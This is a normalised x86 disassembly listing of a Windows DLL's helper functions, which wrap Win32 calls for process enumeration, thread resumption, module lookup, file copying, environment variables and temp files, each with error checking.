lea esi [ ebp - 0x3c ]
call sub_10001a52
call sub_100142eb
retn 0x4
sub_1000a264
push ebp
mov ebp esp
sub esp 0x30
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
je r-xdata
pop edi
pop esi
leave
retn
call [ GetLastError@IAT ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
mov edi eax
lea esi [ ebp - 0x2c ]
call sub_1000ac43
push r--data
mov eax esi
push eax
call sub_10013de1
sub_1000a29a
push esi
push edi
mov edi [ esp + 0xc ]
push edi
mov esi ecx
call sub_1000a2bb
mov [ esi ] r--data
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
pop edi
mov eax esi
pop esi
retn 0x4
sub_1000a2f5
push 0x48
mov eax sub_10026f6d
call sub_10014213
mov eax [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] r--data
mov [ eax + 0x4 ] edx
and [ ebp - 0x4 ] 0x0
mov [ eax ] r--data
mov edx [ ecx + 0x4 ]
mov [ eax + 0x8 ] edx
cmp [ ecx ] 0x0
jne r-xdata
call sub_100142eb
retn 0x4
push r--data
lea ecx [ ebp - 0x2c ]
call sub_100016bc
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100083d8
push r--data
lea eax [ ebp - 0x54 ]
push eax
call sub_10013de1
sub_1000a358
push 0x20
mov eax sub_100279d9
call sub_10014213
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call [ ResumeThread@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_100016bc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0xffffffff
setne al
movzx eax al
push eax
call sub_1000a264
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_1000197b
call sub_100142eb
retn 0x4
sub_1000a3ac
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10027a27
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
push r--data
lea ecx [ esp + 0x10 ]
mov esi eax
call sub_100016bc
and [ esp + 0x78 ] 0x0
lea eax [ esp + 0xc ]
push eax
cmp esi 0xffffffff
sete al
movzx eax al
push eax
call sub_1000a264
or [ esp + 0x80 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ esp + 0x14 ]
call sub_1000197b
test esi esi
je r-xdata
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push r--data
lea ecx [ esp + 0x2c ]
call sub_100016bc
lea eax [ esp + 0x28 ]
push eax
lea eax [ esp + 0x48 ]
push eax
mov [ esp + 0x80 ] 0x1
call sub_100083d8
push r--data
lea eax [ esp + 0x48 ]
push eax
call sub_10013de1
sub_1000a490
push 0x1c
mov eax sub_100279fc
call sub_10014213
push r--data
lea esi [ ebp - 0x28 ]
mov [ edi ] r--data
call sub_1000170e
and [ ebp - 0x4 ] 0x0
mov eax esi
push eax
call sub_1000a4d6
push 0x0
push 0x1
mov [ edi + 0x4 ] eax
call sub_10001a52
mov eax edi
call sub_100142eb
retn
sub_1000a4d6
push 0x20
mov eax sub_100279d9
call sub_10014213
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
call [ GetModuleHandleW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_100016bc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
test esi esi
sete al
movzx eax al
push eax
call sub_1000a264
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_1000197b
mov eax esi
call sub_100142eb
retn 0x4
sub_1000a537
push 0x44
mov eax sub_100279b6
call sub_10014213
lea eax [ ebp - 0x10 ]
push eax
push sub_1000102d
xor ebx ebx
push 0x6
mov [ ebp - 0x10 ] ebx
call [ GetModuleHandleExW@IAT ]
mov esi r--data
push esi
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x14 ] eax
call sub_100016bc
xor edi edi
lea eax [ ebp - 0x30 ]
inc edi
cmp [ ebp - 0x14 ] edi
push eax
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] ebx
call sub_1000a264
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push ebx
push edi
lea ecx [ ebp - 0x30 ]
call sub_1000197b
push esi
lea ecx [ ebp - 0x4c ]
call sub_100016bc
mov [ ebp - 0x4 ] edi
cmp [ ebp - 0x10 ] ebx
lea eax [ ebp - 0x4c ]
push eax
sete al
movzx eax al
push eax
call sub_1000a264
pop ecx
pop ecx
push ebx
push edi
lea ecx [ ebp - 0x4c ]
call sub_1000197b
mov eax [ ebp - 0x10 ]
call sub_100142eb
retn
sub_1000a5c7
push 0x1c
mov eax sub_10027746
call sub_10014213
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call [ GetProcAddress@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_100016bc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
test esi esi
sete al
movzx eax al
push eax
call sub_1000a264
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_1000197b
mov eax esi
call sub_100142eb
retn 0x8
sub_1000a62e
push 0x230
mov eax sub_1002797e
call sub_1001427c
mov eax [ ebp + 0x8 ]
and [ ebp - 0x220 ] 0x0
mov edi 0x208
push edi
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x218 ]
push 0x0
push eax
mov esi ecx
call sub_10011a90
add esp 0xc
push edi
lea eax [ ebp - 0x218 ]
push eax
push [ ebp - 0x21c ]
call [ GetModuleFileNameW@IAT ]
push r--data
lea ecx [ ebp - 0x23c ]
mov edi eax
call sub_100016bc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x23c ]
push eax
test edi edi
sete al
movzx eax al
push eax
call sub_1000a264
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x23c ]
call sub_1000197b
push edi
lea eax [ ebp - 0x218 ]
push eax
call sub_1000559b
mov eax esi
call sub_100142ff
retn
sub_1000a70c
push 0x3c
mov eax sub_10027958
call sub_10014213
xor edi edi
push edi
push 0x2
call CreateToolhelp32Snapshot
mov esi r--data
push esi
lea ecx [ ebp - 0x28 ]
mov ebx eax
call sub_100016bc
lea eax [ ebp - 0x28 ]
push eax
cmp ebx edi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1000a264
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push edi
inc edi
push edi
lea ecx [ ebp - 0x28 ]
call sub_1000197b
push esi
lea ecx [ ebp - 0x44 ]
call sub_100016bc
lea eax [ ebp - 0x44 ]
push eax
cmp ebx 0xffffffff
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1000a264
pop ecx
pop ecx
push 0x0
push edi
lea ecx [ ebp - 0x44 ]
call sub_1000197b
mov eax ebx
call sub_100142eb
retn
sub_1000a78c
push 0x60
mov eax sub_1002792d
call sub_10014213
test edi edi
jne r-xdata
mov esi 0x22c
push esi
push 0x0
push edi
call sub_10011a90
mov eax [ ebp + 0x8 ]
add esp 0xc
mov [ edi ] esi
mov eax [ eax + 0x4 ]
push edi
push eax
call Process32FirstW
xor ebx ebx
mov esi eax
inc ebx
cmp esi ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x44 ]
call sub_100016bc
and [ ebp - 0x4 ] edi
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x6c ]
push eax
call sub_100083d8
push r--data
lea eax [ ebp - 0x6c ]
push eax
call sub_10013de1
push r--data
lea ecx [ ebp - 0x28 ]
call sub_100016bc
lea eax [ ebp - 0x28 ]
push eax
cmp esi ebx
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] ebx
call sub_1000a264
pop ecx
pop ecx
push 0x0
push ebx
lea ecx [ ebp - 0x28 ]
call sub_1000197b
mov al bl
call [ GetLastError@IAT ]
cmp eax 0x12
jne r-xdata
xor al al
jmp r-xdata
call sub_100142eb
retn 0x4
sub_1000a838
push 0x60
mov eax sub_1002792d
call sub_10014213
test edi edi
jne r-xdata
mov esi 0x22c
push esi
push 0x0
push edi
call sub_10011a90
mov eax [ ebp + 0x8 ]
add esp 0xc
mov [ edi ] esi
mov eax [ eax + 0x4 ]
push edi
push eax
call Process32NextW
xor ebx ebx
mov esi eax
inc ebx
cmp esi ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x44 ]
call sub_100016bc
and [ ebp - 0x4 ] edi
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x6c ]
push eax
call sub_100083d8
push r--data
lea eax [ ebp - 0x6c ]
push eax
call sub_10013de1
push r--data
lea ecx [ ebp - 0x28 ]
call sub_100016bc
lea eax [ ebp - 0x28 ]
push eax
cmp esi ebx
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] ebx
call sub_1000a264
pop ecx
pop ecx
push 0x0
push ebx
lea ecx [ ebp - 0x28 ]
call sub_1000197b
mov al bl
call [ GetLastError@IAT ]
cmp eax 0x12
jne r-xdata
xor al al
jmp r-xdata
call sub_100142eb
retn 0x4
sub_1000a8e4
push 0x1c
mov eax sub_10027746
call sub_10014213
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
push 0x0
push eax
push ecx
call [ CopyFileW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov edi eax
call sub_100016bc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp edi 0x1
setne al
movzx eax al
push eax
call sub_1000a264
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_1000197b
call sub_100142eb
retn
sub_1000a953
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_100278ef
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x88 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa0 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0x14 ] eax
mov eax [ ebp + 0xc ]
xor esi esi
cmp [ eax + 0x18 ] 0x8
mov [ esp + 0x18 ] eax
mov [ esp + 0x10 ] esi
jb r-xdata
add eax 0x4
mov [ esp + 0x10 ] eax
add eax 0x4
mov [ esp + 0x10 ] eax
mov eax [ eax ]
jmp r-xdata
lea esi [ esp + 0x7c ]
call sub_10001e1d
test al al
je r-xdata
call sub_1000f9c4
mov ebx [ GetEnvironmentVariableW@IAT ]
push esi
push esi
push eax
call ebx
push r--data
lea ecx [ esp + 0x20 ]
mov edi eax
call sub_100016bc
lea eax [ esp + 0x1c ]
push eax
cmp edi esi
sete al
movzx eax al
push eax
mov [ esp + 0xb0 ] esi
call sub_1000a264
or [ esp + 0xb0 ] 0xffffffff
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ esp + 0x24 ]
call sub_1000197b
xor eax eax
mov [ esp + 0x94 ] 0x7
mov [ esp + 0x90 ] esi
mov [ esp + 0x80 ] ax
cmp edi 0xffffffff
jne r-xdata
mov [ esp + 0xa8 ] 0x1
cmp [ esp + 0x94 ] 0x8
mov ecx [ esp + 0x80 ]
jae r-xdata
push edi
xor eax eax
xor edx edx
mov ecx esi
call sub_10007408
mov ecx edi
mov eax esi
call sub_10001e05
mov eax [ esp + 0x18 ]
cmp [ eax + 0x18 ] 0x8
mov eax [ esp + 0x10 ]
jb r-xdata
lea ecx [ esp + 0x80 ]
push [ esp + 0x90 ]
push ecx
push eax
call ebx
push r--data
lea ecx [ esp + 0x20 ]
mov esi eax
call sub_100016bc
lea eax [ esp + 0x1c ]
push eax
test esi esi
sete al
movzx eax al
push eax
mov [ esp + 0xb0 ] 0x2
call sub_1000a264
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
mov [ esp + 0xb0 ] 0x1
call sub_1000197b
inc esi
cmp edi esi
je r-xdata
mov eax [ eax ]
cmp [ esp + 0x94 ] 0x8
mov eax [ esp + 0x80 ]
jae r-xdata
push r--data
lea ecx [ esp + 0x3c ]
call sub_100016bc
lea eax [ esp + 0x38 ]
push eax
lea eax [ esp + 0x58 ]
push eax
mov [ esp + 0xb0 ] 0x3
call sub_100083d8
push r--data
lea eax [ esp + 0x58 ]
push eax
call sub_10013de1
mov esi [ esp + 0x14 ]
push eax
call sub_1000170e
push 0x0
push 0x1
lea esi [ esp + 0x84 ]
call sub_10001a52
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0xa0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x88 ]
xor ecx esp
call sub_10010789
mov esp ebp
pop ebp
retn
lea eax [ esp + 0x80 ]
sub_1000ab65
push 0x27c
mov eax sub_100278a1
call sub_1001427c
xor ebx ebx
push 0x20a
lea eax [ ebp - 0x224 ]
push ebx
push eax
mov esi ecx
mov edi edx
mov [ ebp - 0x228 ] ebx
call sub_10011a90
add esp 0xc
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea eax [ ebp - 0x224 ]
push eax
call sub_1000170e
mov eax esi
call sub_100142ff
retn
push r--data
lea ecx [ ebp - 0x260 ]
call sub_100016bc
lea eax [ ebp - 0x260 ]
push eax
lea eax [ ebp - 0x288 ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_100083d8
push r--data
lea eax [ ebp - 0x288 ]
push eax
call sub_10013de1
lea eax [ ebp - 0x224 ]
push eax
push ebx
push ebx
push edi
call [ GetTempFileNameW@IAT ]
push r--data
lea ecx [ ebp - 0x244 ]
mov edi eax
call sub_100016bc
lea eax [ ebp - 0x244 ]
push eax
cmp edi ebx
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] ebx
call sub_1000a264
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push ebx
xor ebx ebx
inc ebx
push ebx
lea ecx [ ebp - 0x244 ]
call sub_1000197b
cmp edi 0x6f
jne r-xdata
sub_1000ac43
push 0x20
mov eax sub_100279d9
call sub_10014213
push edi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x28 ]
push eax
call sub_1000ac9a
add esp 0xc
and [ ebp - 0x4 ] 0x0
push eax
push esi
call sub_100083d8
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
mov [ esi ] r--data
call sub_1000197b
mov [ esi ] r--data
mov [ esi + 0x28 ] edi
mov eax esi
call sub_100142eb
retn 0x4
sub_1000ac9a
push 0xd8
mov eax sub_100273d7
call sub_1001427c
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x50 ] eax
lea eax [ ebp + 0x10 ]
xor edi edi
push eax
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x54 ] edi
call sub_1000ae51
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x48 ]
call sub_1000adb8
pop ecx
push [ ebp - 0x50 ]
xor ebx ebx
lea eax [ ebp - 0xe0 ]
inc ebx
push eax
mov [ ebp - 0x4 ] bl
call sub_1000ae85
push r--data
push eax
lea eax [ ebp - 0xa8 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1000aed2
add esp 0x14
mov ecx esi
push ecx
push eax
lea eax [ ebp - 0x8c ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_1000af25
add esp 0xc
push r--data
push eax
lea eax [ ebp - 0xc4 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_1000aed2
add esp 0xc
lea ecx [ ebp - 0x48 ]
push ecx
push eax
lea eax [ ebp - 0x70 ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_1000af25
add esp 0xc
push r--data
push eax
push [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x6
call sub_1000aed2
add esp 0xc
push edi
push ebx
lea ecx [ ebp - 0x70 ]
call sub_1000197b
push edi
push ebx
lea ecx [ ebp - 0xc4 ]
call sub_1000197b
push edi
push ebx
lea ecx [ ebp - 0x8c ]
call sub_1000197b
push edi
push ebx
lea ecx [ ebp - 0xa8 ]
call sub_1000197b
push edi
push ebx
lea ecx [ ebp - 0xe0 ]
call sub_1000197b
push edi
push ebx
lea ecx [ ebp - 0x48 ]
call sub_1000197b
push edi
push ebx
mov ecx esi
call sub_1000197b
mov eax [ ebp - 0x4c ]
call sub_100142ff
retn
sub_1000adb8
push 0x28
mov eax sub_10027378
call sub_10014213
xor edi edi
push edi
push edi
lea eax [ ebp - 0x10 ]
push eax
push 0x400
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
push edi
mov ebx ecx
mov [ ebp - 0x18 ] edi
push 0x1300
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] edi
call [ FormatMessageA@IAT ]
mov esi eax
cmp esi 0x4
jbe r-xdata
push r--data
mov ecx ebx
call sub_100016bc
xor ebx ebx
mov [ ebp - 0x4 ] edi
inc ebx
mov [ ebp - 0x18 ] ebx
cmp [ ebp - 0x10 ] edi
je r-xdata
sub esi 0x3
mov eax [ ebp - 0x14 ]
call sub_100142eb
retn
cmp esi edi
jbe r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
push esi
push [ ebp - 0x10 ]
lea esi [ ebp - 0x34 ]
call sub_10009e62
push 0xffffffff
push edi
mov [ ebp - 0x4 ] ebx
mov ecx [ ebp - 0x14 ]
push eax
call sub_100018cc
push edi
push ebx
mov ecx esi
call sub_1000197b
push [ ebp - 0x10 ]
call [ LocalFree@IAT ]
sub_1000ae51
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x1c ] 0x0
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
mov ecx esi
call sub_1000af70
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_10010789
leave
retn
sub_1000ae85
push 0x20
mov eax sub_1002733c
call sub_10014213
and [ ebp - 0x10 ] 0x0
push r--data
lea ecx [ ebp - 0x2c ]
call sub_100016bc
mov esi eax
mov eax [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
push 0xffffffff
push 0x0
call sub_1000637a
mov ecx [ ebp + 0x8 ]
push eax
call sub_100016de
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000197b
mov eax [ ebp + 0x8 ]
call sub_100142eb
retn
sub_1000aed2
push 0x20
mov eax sub_1002733c
call sub_10014213
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_100016de
mov edi eax
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
call sub_10010990
pop ecx
push eax
push [ ebp + 0x10 ]
mov eax edi
call sub_100060ef
mov ecx [ ebp + 0x8 ]
push eax
call sub_100016de
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000197b
mov eax [ ebp + 0x8 ]
call sub_100142eb
retn
sub_1000af25
push 0x20
mov eax sub_1002733c
call sub_10014213
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_100016de
mov esi eax
mov eax [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
push 0xffffffff
push 0x0
call sub_1000637a
mov ecx [ ebp + 0x8 ]
push eax
call sub_100016de
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000197b
mov eax [ ebp + 0x8 ]
call sub_100142eb
retn
sub_1000af70
push 0xc
mov eax sub_10026f42
call sub_10014213
mov eax [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
mov esi ecx
mov [ ebp - 0x14 ] esi
lea edi [ eax + 0x13 ]
call sub_100016a9
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
mov ecx edi
mov [ ebp - 0x10 ] 0x1
call sub_1000afb9
pop ecx
push [ ebp - 0x14 ]
push edi
push eax
push esi
call sub_1000b1b7
mov eax esi
call sub_100142eb
retn
sub_1000afb9
push 0x30
mov eax sub_10026f04
call sub_1001427c
mov esi ecx
call sub_1000fcc0
mov [ ebp - 0x34 ] eax
call sub_1000faee
mov ecx eax
call sub_100086fb
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x34 ]
push eax
call sub_1000b11b
mov edi eax
pop ecx
lea eax [ ebp - 0x2c ]
push eax
mov ecx edi
call sub_10006363
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2d ] 0x0
mov eax [ edi ]
mov ecx edi
call [ eax + 0x8 ]
mov [ ebp - 0x2d ] al
jmp r-xdata
xor edi edi
lea eax [ ebp - 0x2c ]
call sub_1000757c
mov bl [ eax ]
mov bl 0x7f
jmp r-xdata
and [ ebp - 0x38 ] 0x0
xor edi edi
lea eax [ ebp - 0x2c ]
call sub_1000757c
cmp [ eax ] 0x0
jg r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
push 0xa
pop edi
div edi
dec cl
dec esi
add dl 0x30
mov [ esi ] dl
mov [ ebp + 0x8 ] eax
test eax eax
jne r-xdata
mov edi [ ebp - 0x38 ]
inc edi
mov [ ebp - 0x38 ] edi
cmp edi [ ebp - 0x3c ]
jae r-xdata
mov cl bl
test cl cl
jne r-xdata
push eax
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000197b
lea ecx [ ebp - 0x34 ]
call sub_100086e3
mov eax esi
call sub_100142ff
retn
mov al [ ebp - 0x2d ]
dec esi
mov cl bl
mov [ esi ] al
lea eax [ ebp - 0x2c ]
call sub_1000757c
mov al [ eax ]
mov bl 0x7f
test al al
jle r-xdata
mov bl al
sub_1000b097
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_10011c26
push [ esi + 0x10 ]
call sub_10011c26
push [ esi + 0x14 ]
call sub_10011c26
add esp 0xc
mov [ esi ] r--data
pop esi
retn
sub_1000b11b
push 0x14
mov eax sub_10027440
call sub_10014213
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000fe10
and [ ebp - 0x4 ] 0x0
mov edi [ rw-data ]
mov esi rw-data
mov [ ebp - 0x10 ] edi
call sub_10007ab9
mov esi eax
mov eax [ ebp + 0x8 ]
call sub_10007aea
mov esi eax
test esi esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1000fe38
mov eax esi
call sub_100142eb
retn
test edi edi
je r-xdata
push [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
call sub_1000b200
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov esi edi
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov ecx esi
mov [ rw-data ] esi
call sub_100086fb
push esi
call sub_1000fbb3
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100108f6
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10013de1
sub_1000b1b7
push ebp
mov ebp esp
and esp 0xfffffff8
mov ecx [ ebp + 0x8 ]
sub esp 0x10
push esi
push edi
lea eax [ esp + 0x8 ]
call sub_1000952f
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
lea eax [ esp + 0x10 ]
call sub_1000950f
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push edi
push esi
push [ eax + 0x4 ]
push [ eax ]
push [ esp + 0x18 ]
push [ ebp + 0x10 ]
call sub_1000b376
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
sub_1000b200
push 0x98
mov eax sub_10026ed6
call sub_10014213
xor ebx ebx
mov [ ebp - 0x10 ] ebx
cmp edi ebx
je r-xdata
push 0x4
pop eax
call sub_100142eb
retn
cmp [ edi ] ebx
jne r-xdata
push 0x18
call sub_10010c96
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
inc ebx
test esi esi
je r-xdata
xor esi esi
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
call sub_10007cfd
push eax
lea eax [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] bl
push eax
mov [ ebp - 0x10 ] ebx
call sub_10007ca8
and [ esi + 0x4 ] 0x0
push 0x3
pop eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
push esi
mov [ esi ] r--data
call sub_1000b2ad
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea eax [ ebp - 0xa4 ]
push eax
call sub_10007d1a
mov [ ebp - 0x4 ] 0x4
test [ ebp - 0x10 ] 0x2
mov [ edi ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x30 ]
call sub_1000197b
sub_1000b2ad
push 0x4
mov eax sub_10026b1d
call sub_10014246
mov esi [ ebp + 0x8 ]
call sub_10011b0a
mov edi eax
xor eax eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ ebp - 0x4 ] eax
call sub_100105a7
mov eax [ edi + 0x8 ]
call sub_100072ba
mov [ esi + 0x8 ] eax
call sub_100105a7
mov eax r--data
call sub_100072ba
mov [ esi + 0x10 ] eax
call sub_100105a7
mov eax r--data
call sub_100072ba
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x14 ] eax
call sub_100105a7
mov eax [ edi ]
mov al [ eax ]
mov [ esi + 0xc ] al
call sub_100105a7
mov eax [ edi + 0x4 ]
mov al [ eax ]
mov [ esi + 0xd ] al
call sub_100105a7
mov eax r--data
call sub_100072ba
mov [ esi + 0x8 ] eax
call sub_100105a7
mov [ esi + 0xc ] 0x2e
call sub_100105a7
mov [ esi + 0xd ] 0x2c
call sub_100142eb
retn 0x4
sub_1000b34e
mov esi [ ebp + 0x8 ]
push [ esi + 0x8 ]
call sub_10011c26
push [ esi + 0x10 ]
call sub_10011c26
push [ esi + 0x14 ]
call sub_10011c26
add esp 0xc
xor eax eax
push eax
push eax
call sub_10013de1
int3
sub_1000b376
push 0x2c
mov eax sub_10026e69
call sub_1001427c
mov edi ecx
push 0x0
lea ecx [ ebp - 0x2c ]
mov esi edx
mov [ ebp - 0x14 ] 0xf
call sub_10001ca7
push [ ebp - 0x30 ]
lea eax [ ebp - 0x2c ]
push [ ebp + 0x8 ]
mov ecx esi
push eax
call sub_1000b403
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x38 ]
mov ecx edi
call sub_1000950f
push [ ebp + 0x14 ]
mov esi [ eax ]
push [ ebp + 0x10 ]
mov ebx [ eax + 0x4 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
call sub_1000b61c
push ebx
push esi
push [ ebp + 0x14 ]
mov [ ebp - 0x30 ] eax
push [ ebp + 0x10 ]
call sub_1000b61c
add esp 0x20
lea ecx [ ebp - 0x2c ]
push ecx
push [ ebp - 0x30 ]
mov esi eax
call sub_1000b46f
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000197b
mov eax edi
call sub_100142ff
retn 0x18
sub_1000b403
push 0x4
mov eax sub_10026e46
call sub_10014246
mov esi ecx
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov ebx [ edi + 0x14 ]
sub eax esi
cmp ebx eax
ja r-xdata
and [ ebp - 0x4 ] 0x0
cmp [ edi + 0x18 ] eax
je r-xdata
call sub_100142eb
retn 0xc
movzx eax [ esi ]
xor ebx ebx
push eax
inc ebx
call sub_100047d5
inc esi
jmp r-xdata
push 0x1
push eax
mov ecx edi
call sub_10001cc3
test al al
je r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
push ebx
mov ecx edi
call sub_10001ca7
sub_1000b46f
push ebp
mov ebp esp
sub esp 0xc
or [ ebp - 0x4 ] 0xffffffff
cmp [ edi + 0x14 ] esi
jae r-xdata
mov eax [ edi + 0x14 ]
mov ecx eax
sub ecx esi
cmp ecx [ ebp + 0x8 ]
jae r-xdata
call sub_1000f9fc
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x14 ]
cmp ecx 0xffffffff
jae r-xdata
mov [ ebp + 0x8 ] ecx
sub eax [ ebp + 0x8 ]
or ecx 0xffffffff
sub ecx [ ebp - 0x4 ]
cmp ecx eax
ja r-xdata
mov [ ebp - 0x4 ] ecx
mov eax [ edi + 0x14 ]
push ebx
mov ecx eax
sub ecx [ ebp + 0x8 ]
mov ebx eax
add ecx [ ebp - 0x4 ]
sub ebx esi
